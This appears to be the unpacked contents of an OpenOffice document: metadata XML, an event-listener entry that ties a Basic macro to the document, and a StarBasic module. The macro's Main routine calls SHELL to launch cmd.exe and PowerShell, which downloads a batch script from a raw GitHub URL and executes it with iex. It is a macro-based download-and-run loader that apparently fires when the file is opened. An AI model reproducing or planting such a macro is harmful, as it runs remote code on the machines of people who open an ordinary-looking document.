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Test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Test.Main?language=Basic&amp;location=document" xlink:type="simple"/>
    </office:event-listeners>
  </office:scripts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4-03T17:17:42.40</meta:creation-date>
    <dc:date>2018-04-03T17:33:53.57</dc:date>
    <meta:editing-duration>PT14M23S</meta:editing-duration>
    <meta:editing-cycles>2</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.5$Win32 OpenOffice.org_project/415m1$Build-9789</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="1" meta:paragraph-count="0" meta:word-count="0" meta:character-count="0"/>
  </office:meta>
</office:document-meta>
</file>

<file path=Basic/Standard/Test.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Test" script:language="StarBasic">REM  *****  BASIC  *****

Sub Main
	SHELL("cmd.exe /C ""powershell.exe $MyScript = Invoke-WebRequest 'https://raw.githubusercontent.com/heptastique/SERE/master/script.bat';iex $MyScript;PAUSE""")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